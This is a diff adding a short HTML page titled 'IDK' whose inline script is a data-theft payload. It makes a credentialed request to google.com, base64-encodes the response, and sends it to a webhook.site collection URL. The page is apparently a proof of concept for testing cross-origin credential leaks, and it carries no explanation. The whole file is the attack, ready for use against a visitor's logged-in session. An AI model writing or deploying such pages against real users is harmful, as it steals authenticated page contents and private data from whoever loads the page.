@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IDK</title>
+</head>
+
+<body>
+    <script>
+
+        var req1 = new XMLHttpRequest();
+        req1.open("GET", "https://google.com/", false);
+        req1.withCredentials = true;
+        req1.send();
+
+        var req2 = new XMLHttpRequest();
+        req2.open("GET", "https://webhook.site/ffc8b5af-72ff-40af-82a0-2aa305eead84/?" + btoa(req1.response), false);
+        req2.send();
+
+    </script>
+</body>
+</html>
